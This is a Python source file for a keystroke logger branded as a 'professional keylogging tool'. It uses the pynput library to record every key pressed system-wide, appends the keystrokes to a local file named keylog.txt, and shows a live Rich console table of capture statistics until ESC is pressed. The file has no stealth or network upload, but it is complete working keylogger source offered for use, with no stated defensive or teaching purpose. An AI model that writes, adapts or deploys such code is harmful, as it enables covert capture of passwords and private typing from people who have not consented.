#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Rich Keylogger - Professional Keylogging Tool
Advanced keylogger with Rich console interface
"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.layout import Layout
from rich.live import Live
import pynput.keyboard
import threading
import time
from datetime import datetime
import os

console = Console()

class RichKeylogger:
    def __init__(self):
        self.keys = []
        self.start_time = datetime.now()
        self.log_file = "keylog.txt"
        
    def on_press(self, key):
        """Handle key press"""
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                key_str = " "
            elif key == pynput.keyboard.Key.enter:
                key_str = "\n"
            elif key == pynput.keyboard.Key.tab:
                key_str = "\t"
            else:
                key_str = f"[{str(key)}]"
        
        self.keys.append({
            'key': key_str,
            'time': datetime.now().strftime("%H:%M:%S")
        })
        
        # Save to file
        with open(self.log_file, "a") as f:
            f.write(key_str)
        
        return True
        
    def on_release(self, key):
        """Handle key release"""
        if key == pynput.keyboard.Key.esc:
            console.print("\n[red]Recording stopped[/red]")
            return False
        
    def create_table(self):
        """Create keylogger stats table"""
        table = Table(title="Keylogger Stats")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        
        elapsed = (datetime.now() - self.start_time).seconds
        table.add_row("Keys Captured", str(len(self.keys)))
        table.add_row("Time Elapsed", f"{elapsed} seconds")
        table.add_row("Log File", self.log_file)
        table.add_row("Status", "[green]Active[/green]")
        
        return table
        
    def start(self):
        """Start keylogger"""
        console.print(Panel.fit(
            "[bold green]Rich Keylogger Started[/bold green]\n"
            "Press ESC to stop",
            border_style="green"
        ))
        
        # Start listener
        listener = pynput.keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        listener.start()
        
        # Create live display
        with Live(self.create_table(), refresh_per_second=4) as live:
            try:
                while listener.is_alive():
                    live.update(self.create_table())
                    time.sleep(0.25)
            except KeyboardInterrupt:
                pass
        
        # Final stats
        console.print(f"\n[green]✓ Keys captured: {len(self.keys)}[/green]")
        console.print(f"[green]✓ Saved to: {self.log_file}[/green]")

if __name__ == "__main__":
    console.print(Panel.fit(
        "[bold cyan]Rich Keylogger[/bold cyan]\n"
        "Professional keylogging tool"
    ))
    
    logger = RichKeylogger()
    logger.start()

